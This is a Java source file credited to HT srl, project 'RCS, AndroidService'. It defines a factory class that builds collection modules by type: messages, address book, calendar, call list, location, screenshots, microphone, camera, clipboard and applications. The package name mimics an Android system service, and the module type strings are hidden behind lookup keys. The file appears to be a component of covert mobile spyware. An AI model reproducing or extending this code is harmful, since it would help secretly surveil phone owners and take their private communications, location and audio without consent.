/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentFactory.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module;

import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.interfaces.AbstractFactory;
import com.android.service.util.Check;

public class FactoryAgent implements AbstractFactory<BaseModule, String> {
	private static final String TAG = "FactoryAgent"; //$NON-NLS-1$

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	public BaseModule create(String type, String subtype) {
		BaseModule a = null;

		if (Messages.getString("b.0").equals(type)) { //$NON-NLS-1$
			a = new ModuleMessage();
		} else if (Messages.getString("b.1").equals(type)) { //$NON-NLS-1$
			a = new ModuleAddressBook();
		} else if (Messages.getString("b.2").equals(type)) { //$NON-NLS-1$
			a = new ModuleCalendar();
		} else if (Messages.getString("b.3").equals(type) || Messages.getString("b.4").equals(type)) { // Alias //$NON-NLS-1$ //$NON-NLS-2$
																		// per
																		// la
																		// 8.0
			if (Status.calllistCreated == false) {
				a = new ModuleCallList();
				Status.calllistCreated = true;
			}
		} else if (Messages.getString("b.5").equals(type)) { //$NON-NLS-1$
			a = new ModuleDevice();
		} else if (Messages.getString("b.6").equals(type)) { //$NON-NLS-1$
			a = new ModulePosition();
		} else if (Messages.getString("b.7").equals(type) || Messages.getString("b.8").equals(type)) { // 7.6 //$NON-NLS-1$ //$NON-NLS-2$
																			// ->
																			// 8.0
			a = new ModuleSnapshot();
		} else if (Messages.getString("b.9").equals(type)) { //$NON-NLS-1$
			a = new ModuleMessage();
		} else if (Messages.getString("b.10").equals(type)) { //$NON-NLS-1$
			a = new ModuleMic();
		} else if (Messages.getString("b.11").equals(type)) { //$NON-NLS-1$
			a = new ModuleCamera();
		} else if (Messages.getString("b.12").equals(type)) { //$NON-NLS-1$
			a = new ModuleClipboard();
		} else if (Messages.getString("b.13").equals(type)) { //$NON-NLS-1$
			a = new ModuleCrisis();
		} else if (Messages.getString("b.14").equals(type)) { //$NON-NLS-1$
			a = new ModuleApplication();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (factory), unknown type: " + type);//$NON-NLS-1$
			}
		}

		return a;
	}
}
